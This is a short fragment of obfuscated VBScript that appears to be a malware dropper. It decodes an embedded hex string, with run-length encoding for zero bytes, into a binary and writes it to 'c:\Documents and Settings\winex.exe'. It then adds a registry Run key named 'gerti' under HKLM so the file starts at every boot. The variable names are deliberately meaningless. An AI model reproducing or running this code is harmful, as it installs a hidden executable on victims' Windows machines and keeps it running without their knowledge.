l = 1 : ger = "" : While l<=len(o) : If mid(o,l,1) = "z" then
c = l+1 : m = 0 : while mid(o,c,1)<>"z" : m = m*10 + mid(o,c,1) : c = c+1 : WEnd : l = c+1 : for c=1 to m : ger = ger + "00" : Next
ElseIf mid(o,l,1) <> "z" then : ger = ger & mid(o,l,2) : l = l+2 
end if : WEnd : Set sdgdgf = CreateObject("Scripting.FileSystemObject") : If sdgdgf.FileExists("c:\Documents and Settings\winex.exe")=True then sdgdgf.DeleteFile "c:\Documents and Settings\winex.exe",True : end if
Set dszhj = sdgdgf.CreateTextFile("c:\Documents and Settings\winex.exe", ForWriting) : l = 1 : while l < len(ger)
o = Int("&H" & Mid(ger, l, 2)) : dszhj.Write(Chr(o)) : l = l+2 : WEnd : dszhj.Close
Set mphnfhk=WScript.CreateObject("WScript.Shell") : mphnfhk.Regwrite"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\gerti","c:\Documents and Settings\winex.exe"
